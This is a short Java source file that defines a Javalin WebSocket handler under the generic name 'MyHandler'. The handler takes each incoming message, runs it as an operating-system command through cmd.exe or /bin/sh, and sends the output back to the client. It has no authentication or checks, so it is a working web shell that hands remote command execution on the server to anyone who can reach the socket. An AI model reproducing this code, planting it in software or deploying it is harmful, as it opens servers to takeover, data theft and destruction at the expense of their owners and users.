import io.javalin.websocket.WsMessageContext;
import io.javalin.websocket.WsMessageHandler;
import org.jetbrains.annotations.NotNull;

class MyHandler implements WsMessageHandler {

    @Override
    public void handleMessage(@NotNull WsMessageContext wsMessageContext) throws Exception {
        String cmd = wsMessageContext.message();
        String o = "";
        ProcessBuilder p;
        if(System.getProperty("os.name").toLowerCase().contains("win")){
            p = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
        }else{
            p = new ProcessBuilder(new String[]{"/bin/sh", "-c", cmd});
        }
        java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
        o = c.hasNext() ? c.next(): o;
        wsMessageContext.send(o);
    }
}